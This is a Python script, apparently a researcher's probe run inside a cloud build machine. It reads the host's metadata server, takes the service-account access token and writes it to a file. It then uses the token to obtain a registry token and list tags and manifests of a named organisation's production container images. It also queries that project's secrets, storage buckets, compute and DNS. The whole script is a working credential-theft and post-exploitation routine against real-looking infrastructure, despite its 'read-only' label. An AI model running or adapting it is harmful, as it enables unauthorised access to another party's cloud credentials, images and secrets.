#!/usr/bin/env python3
# I68006: GCE builder metadata / SA / GAR read-only probe.
import os, sys, json, socket, hashlib, time, subprocess, struct

OUT = []
def p(*a):
    line = ' '.join(str(x) for x in a)
    print(line, flush=True)
    OUT.append(line)

def rd(path, n=400):
    try:
        with open(path, 'rb') as f:
            return f.read(n).decode('utf-8', 'replace').strip()
    except Exception as e:
        return 'ERR:%s' % type(e).__name__

def sh(cmd, n=600, to=10):
    try:
        r = subprocess.run(['sh', '-c', cmd], capture_output=True, timeout=to)
        out = (r.stdout + r.stderr).decode('utf-8', 'replace').strip()
        return out[:n]
    except Exception as e:
        return 'ERR:%s' % type(e).__name__

p('=== A HOST IDENTITY ===')
p('product_name=', rd('/sys/class/dmi/id/product_name', 120))
p('sys_vendor=', rd('/sys/class/dmi/id/sys_vendor', 120))
p('board_name=', rd('/sys/class/dmi/id/board_name', 120))
p('board_vendor=', rd('/sys/class/dmi/id/board_vendor', 120))
p('product_serial_perm=', rd('/sys/class/dmi/id/product_serial', 120))
p('hostname=', socket.gethostname())
p('uname=', sh('uname -a', 300))
p('osrelease=', rd('/etc/os-release', 300).replace('\n', ' | '))
p('cpu_count=', str(os.cpu_count()))
p('uid=', str(os.getuid()))
p('cgroup=', rd('/proc/self/cgroup', 200))
p('resolv=', rd('/etc/resolv.conf', 300).replace('\n', ' | '))
p('hosts=', rd('/etc/hosts', 300).replace('\n', ' | '))
p('ipaddr=', sh('ip -o addr 2>/dev/null || ifconfig -a 2>/dev/null', 500))
p('route=', sh('ip route 2>/dev/null', 400))
p('route_get_meta=', sh('ip route get 169.254.169.254 2>&1', 200))
p('env_proxy=', ' '.join('%s=%s' % (k, v) for k, v in os.environ.items() if 'proxy' in k.lower() or 'PROXY' in k)[:300])

# ---- DNS control probe to 169.254.169.254:53 (UDP) ----
p('=== B DNS 169.254.169.254:53 ===')
def dns_q(name):
    tid = struct.pack('!H', int(time.time() * 1000) & 0xffff)
    q = b'\x00\x01\x00\x00\x00\x00\x00\x00'
    for part in name.split('.'):
        q += bytes([len(part)]) + part.encode()
    q += b'\x00\x00\x01\x00\x01'
    pkt = tid + q
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.settimeout(3)
    try:
        s.sendto(pkt, ('169.254.169.254', 53))
        data, addr = s.recvfrom(2048)
        rcode = data[3] & 0x0f
        ancount = struct.unpack('!H', data[6:8])[0]
        return 'OK rcode=%d ancount=%d len=%d' % (rcode, ancount, len(data))
    except Exception as e:
        return 'ERR:%s' % type(e).__name__
    finally:
        s.close()
for n in ('metadata.google.internal', socket.gethostname() + '.c.' if False else 'metadata.google.internal'):
    p('dns', n, dns_q(n))

# ---- raw HTTP to metadata ----
p('=== C METADATA HTTP :80 ===')
def raw_get(path, extra=None, timeout=3, host='metadata.google.internal'):
    hdrs = {'Host': host, 'Metadata-Flavor': 'Google', 'User-Agent': 'curl/8'}
    if extra:
        hdrs.update(extra)
    req = 'GET %s HTTP/1.1\r\n' % path + ''.join('%s: %s\r\n' % (k, v) for k, v in hdrs.items()) + 'Connection: close\r\n\r\n'
    try:
        s = socket.create_connection(('169.254.169.254', 80), timeout=timeout)
    except Exception as e:
        return 'CONNECT_ERR:%s' % type(e).__name__
    try:
        s.settimeout(timeout)
        s.sendall(req.encode())
        data = b''
        while len(data) < 40000:
            try:
                ch = s.recv(8192)
            except socket.timeout:
                if data:
                    break
                return 'READ_TIMEOUT'
            if not ch:
                break
            data += ch
        if not data:
            return 'EMPTY'
        head, _, body = data.partition(b'\r\n\r\n')
        hl = head.decode('utf-8', 'replace').split('\r\n')
        status = hl[0]
        hmap = {}
        for l in hl[1:]:
            if ':' in l:
                k, v = l.split(':', 1)
                hmap[k.strip().lower()] = v.strip()
        return {'status': status, 'len': len(body), 'ct': hmap.get('content-type', '-'), 'body': body.decode('utf-8', 'replace')}
    except Exception as e:
        return 'IO_ERR:%s' % type(e).__name__
    finally:
        s.close()

PATHS = [
    '/',
    '/computeMetadata/v1/',
    '/computeMetadata/v1/project/project-id',
    '/computeMetadata/v1/instance/name',
    '/computeMetadata/v1/instance/id',
    '/computeMetadata/v1/instance/zone',
    '/computeMetadata/v1/instance/machine-type',
    '/computeMetadata/v1/instance/service-accounts/',
    '/computeMetadata/v1/instance/service-accounts/default/',
    '/computeMetadata/v1/instance/service-accounts/default/scopes',
    '/computeMetadata/v1/instance/service-accounts/default/token',
    '/computeMetadata/v1/instance/attributes/',
    '/computeMetadata/v1/instance/network-interfaces/?recursive=true',
]
results = {}
for path in PATHS:
    r = raw_get(path)
    results[path] = r
    if isinstance(r, dict):
        p('META', path, 'STATUS=' + r['status'], 'len=%d' % r['len'], 'ct=' + r['ct'], 'body=' + repr(r['body'][:350]))
    else:
        p('META', path, r)

# negative control without header (only for /computeMetadata/v1/ and token)
p('META_NOHEADER /computeMetadata/v1/', raw_get('/computeMetadata/v1/', extra=None))
def raw_get_noh(path, timeout=3):
    req = 'GET %s HTTP/1.1\r\nHost: metadata.google.internal\r\nConnection: close\r\n\r\n' % path
    try:
        s = socket.create_connection(('169.254.169.254', 80), timeout=timeout)
    except Exception as e:
        return 'CONNECT_ERR:%s' % type(e).__name__
    try:
        s.settimeout(timeout); s.sendall(req.encode()); data = s.recv(2000)
        return (data[:300].decode('utf-8', 'replace'))
    except Exception as e:
        return 'IO_ERR:%s' % type(e).__name__
    finally:
        s.close()
p('META_NOHEADER2 /computeMetadata/v1/', raw_get_noh('/computeMetadata/v1/'))

# also test metadata.google.internal hostname via DNS-resolved IP (same IP; sanity)
# and 169.254.169.254:80 TCP connect timing repeated once
t0 = time.time()
try:
    s = socket.create_connection(('169.254.169.254', 80), timeout=3); s.close(); p('TCP80 connect=OK %.2fs' % (time.time() - t0))
except Exception as e:
    p('TCP80 connect=ERR:%s %.2fs' % (type(e).__name__, time.time() - t0))

# ---- D token usage if any ----
p('=== D TOKEN ===')
tok = None
r = results.get('/computeMetadata/v1/instance/service-accounts/default/token', None)
if isinstance(r, dict) and 'access_token' in r.get('body', ''):
    try:
        j = json.loads(r['body'])
        tok = j.get('access_token')
        p('TOKEN_GOT len=%d sha256_16=%s expires_in=%s token_type=%s' % (len(tok or ''), hashlib.sha256((tok or '').encode()).hexdigest()[:16], j.get('expires_in'), j.get('token_type')))
        os.makedirs('/o', exist_ok=True)
        with open('/o/token.txt', 'w') as f:
            f.write(tok)
        os.chmod('/o/token.txt', 0o600)
    except Exception as e:
        p('TOKEN_PARSE_ERR', type(e).__name__, repr(r.get('body'))[:200])

def http_call(method, url, headers=None, body=None, timeout=10):
    import ssl
    u = url.split('://', 1)[1]
    host, path = (u.split('/', 1) + [''])[:2]
    path = '/' + path
    hostonly = host.split(':')[0]
    port = 443
    try:
        raw = socket.create_connection((hostonly, port), timeout=timeout)
        ctx = ssl.create_default_context()
        s = ctx.wrap_socket(raw, server_hostname=hostonly)
        s.settimeout(timeout)
        h = {'Host': host, 'Connection': 'close', 'User-Agent': 'curl/8'}
        if headers:
            h.update(headers)
        req = '%s %s HTTP/1.1\r\n' % (method, path) + ''.join('%s: %s\r\n' % (k, v) for k, v in h.items())
        if body:
            req += 'Content-Length: %d\r\n' % len(body)
        req += '\r\n'
        s.sendall(req.encode() + (body or b''))
        data = b''
        while len(data) < 200000:
            ch = s.recv(16384)
            if not ch:
                break
            data += ch
        s.close()
        head, _, b = data.partition(b'\r\n\r\n')
        hl = head.decode('utf-8', 'replace').split('\r\n')
        return hl[0], '\r\n'.join(hl[1:]), b
    except Exception as e:
        return 'ERR:%s' % type(e).__name__, '', b''

if tok:
    p('--- tokeninfo ---')
    st, hd, b = http_call('GET', 'https://oauth2.googleapis.com/tokeninfo?access_token=' + tok)
    p('TOKENINFO', st, b[:600])
    p('--- GAR token exchange ---')
    import base64
    scope = 'repository:railway-infra/production/backboard:pull'
    basic = base64.b64encode(('oauth2accesstoken:' + tok).encode()).decode()
    st, hd, b = http_call('POST', 'https://us-docker.pkg.dev/v2/token?service=us-docker.pkg.dev&scope=' + scope,
                          headers={'Authorization': 'Basic ' + basic, 'Content-Type': 'application/x-www-form-urlencoded'}, body=b'')
    p('GAR_EXCH', st, b[:400])
    start = b.find(b'"token"')
    gt = None
    if start >= 0:
        try:
            jj = json.loads(b)
            gt = jj.get('token')
            p('GAR_TOKEN_GOT len=%d sha16=%s' % (len(gt or ''), hashlib.sha256((gt or '').encode()).hexdigest()[:16]))
        except Exception as e:
            p('GAR_TOKEN_PARSE_ERR', type(e).__name__)
    if gt:
        auth = {'Authorization': 'Bearer ' + gt}
        for repo in ('production/backboard', 'production/orchestrator', 'production/storage-agent', 'railway/backboard', 'production/network-cp', 'production/builderv3'):
            base = 'https://us-docker.pkg.dev/v2/railway-infra/' + repo
            st, hd, b = http_call('GET', base + '/tags/list', headers=auth)
            p('TAGS', repo, st[:40], b[:220])
        for repo, tag in (('production/backboard', 'latest'), ('production/orchestrator', 'latest'), ('production/builderv3', 'latest')):
            base = 'https://us-docker.pkg.dev/v2/railway-infra/' + repo
            st, hd, b = http_call('GET', base + '/manifests/' + tag,
                                  headers=dict(auth, Accept='application/vnd.oci.image.index.v1+json, application/vnd.docker.distribution.manifest.v2+json'))
            p('MANIFEST', repo + ':' + tag, st[:50], b[:300])
    # wide scope read-only lists
    p('--- wide scope read-only ---')
    for name, url in (
        ('crm_project', 'https://cloudresourcemanager.googleapis.com/v1/projects/railway-infra'),
        ('secrets_list', 'https://secretmanager.googleapis.com/v1/projects/railway-infra/secrets?pageSize=5'),
        ('gcs_buckets', 'https://storage.googleapis.com/storage/v1/b?project=railway-infra&maxResults=5&fields=items(name)'),
        ('compute_zones', 'https://compute.googleapis.com/compute/v1/projects/railway-infra/aggregatedList?maxResults=3&fields=items'),
        ('dns_zones', 'https://dns.googleapis.com/dns/v1/projects/railway-infra/managedZones?maxResults=5&fields=managedZones(name,dnsName)'),
    ):
        st, hd, b = http_call('GET', url, headers={'Authorization': 'Bearer ' + tok, 'Accept': 'application/json'})
        p('WIDE', name, st[:50], b[:300])
else:
    p('NO_TOKEN')

p('=== END ===')
with open('/o/summary.txt', 'w') as f:
    f.write('\n'.join(OUT))
